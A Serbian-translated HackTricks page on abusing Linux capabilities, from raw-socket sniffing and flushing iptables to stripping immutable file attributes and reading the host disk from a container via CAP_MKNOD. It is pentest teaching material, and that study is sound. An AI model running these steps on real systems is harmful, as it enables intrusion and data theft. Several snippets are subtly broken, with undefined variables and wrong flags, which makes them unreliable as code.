​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji događaj u oblasti kibernetičke bezbednosti u **Španiji** i jedan od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je ključno mesto susreta tehnoloških i kibernetičkih stručnjaka iz svih disciplina.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Ovo znači da je moguće osluškivati na bilo kojem portu (čak i na privilegovanim).** Ne možete direktno povećati privilegije sa ovom sposobnošću.

**Primer sa binarnim fajlom**

Ako **`python`** ima ovu sposobnost, biće u mogućnosti da osluškuje na bilo kojem portu i čak se poveže sa bilo kojim drugim portom (neki servisi zahtevaju konekcije sa određenih privilegovanih portova)

{% tabs %}
{% tab title="Osluškivanje" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Poveži se" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) sposobnost omogućava procesima da **kreiraju RAW i PACKET sokete**, omogućavajući im da generišu i šalju proizvoljne mrežne pakete. Ovo može dovesti do sigurnosnih rizika u kontejnerizovanim okruženjima, kao što su lažiranje paketa, ubacivanje saobraćaja i zaobilaženje kontrola pristupa mreži. Zlonamerni akteri mogu iskoristiti ovo da ometaju rutiranje kontejnera ili kompromituju sigurnost mreže domaćina, posebno bez adekvatne zaštite od požara. Dodatno, **CAP\_NET\_RAW** je ključan za privilegovane kontejnere kako bi podržali operacije poput ping-a putem RAW ICMP zahteva.

**Ovo znači da je moguće prisluškivati saobraćaj.** Ne možete direktno eskalirati privilegije sa ovom sposobnošću.

**Primer sa binarnim fajlom**

Ako binarni fajl **`tcpdump`** ima ovu sposobnost, moći ćete ga koristiti za snimanje mrežnih informacija.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Napomena da ako **okruženje** pruža ovu sposobnost, takođe možete koristiti **`tcpdump`** za presretanje saobraćaja.

**Primer sa binarnim 2**

Sledeći primer je **`python2`** kod koji može biti koristan za presretanje saobraćaja na "**lo**" (**localhost**) interfejsu. Kod je iz laboratorije "_The Basics: CAP-NET\_BIND + NET\_RAW_" sa [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```

## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) sposobnost dodeljuje nosiocu moć da **menja mrežne konfiguracije**, uključujući postavke firewall-a, tabele rutiranja, dozvole za sokete i postavke mrežnih interfejsa unutar izloženih mrežnih imenskih prostora. Takođe omogućava uključivanje **promiskuitetnog režima** na mrežnim interfejsima, što omogućava presretanje paketa preko imenskih prostora.

**Primer sa binarnim fajlom**

Pretpostavimo da **python binarni fajl** ima ove sposobnosti.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP\_LINUX\_IMMUTABLE

**Ovo znači da je moguće izmeniti atribute inode-a.** Ne možete direktno povećati privilegije sa ovom sposobnošću.

**Primer sa binarnim fajlom**

Ako otkrijete da je fajl nepromenjiv i da python ima ovu sposobnost, možete **ukloniti nepromenjivi atribut i omogućiti izmenu fajla:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```

{% hint style="info" %}
Imajte na umu da se obično ova nepromenljiva osobina postavlja i uklanja korišćenjem:

```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje `chroot(2)` sistemskog poziva, koji potencijalno može omogućiti izlazak iz `chroot(2)` okruženja kroz poznate ranjivosti:

* [Kako izaći iz različitih chroot rešenja](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: alat za izlazak iz chroot okruženja](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ne samo da omogućava izvršavanje `reboot(2)` sistemskog poziva za restartovanje sistema, uključujući specifične komande poput `LINUX_REBOOT_CMD_RESTART2` prilagođene određenim hardverskim platformama, već omogućava i korišćenje `kexec_load(2)` i, od Linux verzije 3.17 nadalje, `kexec_file_load(2)` za učitavanje novih ili potpisanih kernela za rušenje.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) je odvojen od šireg **CAP\_SYS\_ADMIN** u Linuxu 2.6.37, posebno dodeljujući mogućnost korišćenja `syslog(2)` poziva. Ova sposobnost omogućava pregledavanje adresa jezgra putem `/proc` i sličnih interfejsa kada je postavka `kptr_restrict` na 1, što kontroliše izlaganje adresa jezgra. Od Linux verzije 2.6.39, podrazumevana vrednost za `kptr_restrict` je 0, što znači da su adrese jezgra izložene, iako mnoge distribucije postavljaju ovo na 1 (sakrivaju adrese osim od uid 0) ili 2 (uvek sakrivaju adrese) iz sigurnosnih razloga.

Dodatno, **CAP\_SYSLOG** omogućava pristupanje `dmesg` izlazu kada je `dmesg_restrict` postavljen na 1. Uprkos ovim promenama, **CAP\_SYS\_ADMIN** zadržava sposobnost izvršavanja `syslog` operacija zbog istorijskih presedana.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proširuje funkcionalnost `mknod` sistemskog poziva izvan kreiranja običnih fajlova, FIFO (imenovanih cevi) ili UNIX domenskih soketa. Konkretno, omogućava kreiranje specijalnih fajlova, koji uključuju:

* **S\_IFCHR**: Karakteristični specijalni fajlovi, koji su uređaji poput terminala.
* **S\_IFBLK**: Blokovski specijalni fajlovi, koji su uređaji poput diskova.

Ova sposobnost je bitna za procese koji zahtevaju mogućnost kreiranja uređajskih fajlova, olakšavajući direktnu interakciju sa hardverom putem karakterističnih ili blokovskih uređaja.

Ovo je podrazumevana sposobnost za Docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Ova sposobnost omogućava eskalaciju privilegija (putem čitanja celog diska) na hostu, uz sledeće uslove:

1. Imati početni pristup hostu (bez privilegija).
2. Imati početni pristup kontejneru (Privilegovan (EUID 0), i efektivna `CAP_MKNOD`).
3. Host i kontejner trebaju deliti isti korisnički prostor.

**Koraci za kreiranje i pristupanje blokovskom uređaju u kontejneru:**

1. **Na hostu kao standardni korisnik:**

* Odredite svoj trenutni korisnički ID pomoću `id`, na primer, `uid=1000(standardnikorisnik)`.
* Identifikujte ciljni uređaj, na primer, `/dev/sdb`.

2. **Unutar kontejnera kao `root`:**

```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```

3. **Nazad na hostu:**

```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```

Ovaj pristup omogućava standardnom korisniku pristup i potencijalno čitanje podataka sa `/dev/sdb` preko kontejnera, iskorišćavajući deljene korisničke namespace-ove i dozvole postavljene na uređaju.

### CAP\_SETPCAP

**CAP\_SETPCAP** omogućava procesu da **izmeni skupove sposobnosti** drugog procesa, omogućavajući dodavanje ili uklanjanje sposobnosti iz efektivnih, nasleđenih i dozvoljenih skupova. Međutim, proces može samo izmeniti sposobnosti koje poseduje u svom dozvoljenom skupu, čime se osigurava da ne može povećati privilegije drugog procesa iznad svojih sopstvenih. Nedavna ažuriranja kernela su pooštrila ove pravila, ograničavajući `CAP_SETPCAP` samo na smanjenje sposobnosti u svom ili dozvoljenom skupu svojih potomaka, s ciljem smanjenja rizika po bezbednost. Za korišćenje je potrebno imati `CAP_SETPCAP` u efektivnom skupu i ciljane sposobnosti u dozvoljenom skupu, koristeći `capset()` za izmene. Ovo sažima osnovnu funkciju i ograničenja `CAP_SETPCAP`, ističući njegovu ulogu u upravljanju privilegijama i poboljšanju bezbednosti.

**`CAP_SETPCAP`** je Linux sposobnost koja omogućava procesu da **izmeni skupove sposobnosti drugog procesa**. Dodeljuje mogućnost dodavanja ili uklanjanja sposobnosti iz efektivnih, nasleđenih i dozvoljenih skupova sposobnosti drugih procesa. Međutim, postoje određena ograničenja u vezi sa korišćenjem ove sposobnosti.

Proces sa `CAP_SETPCAP` **može samo dodeliti ili ukloniti sposobnosti koje se nalaze u njegovom sopstvenom dozvoljenom skupu sposobnosti**. Drugim rečima, proces ne može dodeliti sposobnost drugom procesu ako sam nema tu sposobnost. Ovo ograničenje sprečava proces da poveća privilegije drugog procesa iznad svog nivoa privilegija.

Osim toga, u nedavnim verzijama kernela, sposobnost `CAP_SETPCAP` je **dodatno ograničena**. Više ne dozvoljava procesu da proizvoljno menja skupove sposobnosti drugih procesa. Umesto toga, **samo omogućava procesu da smanji sposobnosti u svom sopstvenom dozvoljenom skupu sposobnosti ili dozvoljenom skupu sposobnosti svojih potomaka**. Ova promena je uvedena radi smanjenja potencijalnih bezbednosnih rizika povezanih sa sposobnošću.

Da biste efikasno koristili `CAP_SETPCAP`, morate imati tu sposobnost u svom efektivnom skupu sposobnosti i ciljane sposobnosti u svom dozvoljenom skupu sposobnosti. Zatim možete koristiti sistemski poziv `capset()` za izmenu skupova sposobnosti drugih procesa.

Ukratko, `CAP_SETPCAP` omogućava procesu da izmeni skupove sposobnosti drugih procesa, ali ne može dodeliti sposobnosti koje sam nema. Dodatno, zbog bezbednosnih razloga, njegova funkcionalnost je u nedavnim verzijama kernela ograničena samo na smanjenje sposobnosti u svom sopstvenom dozvoljenom skupu sposobnosti ili dozvoljenom skupu sposobnosti svojih potomaka.

## Reference

**Većina ovih primera je preuzeta iz nekih laboratorija sa** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), pa ako želite da vežbate ove tehnike za povećanje privilegija, preporučujem ove laboratorije.

**Ostale reference**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji kibernetički događaj u **Španiji** i jedan od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je vrelo susretište za profesionalce iz oblasti tehnologije i kibernetičke bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
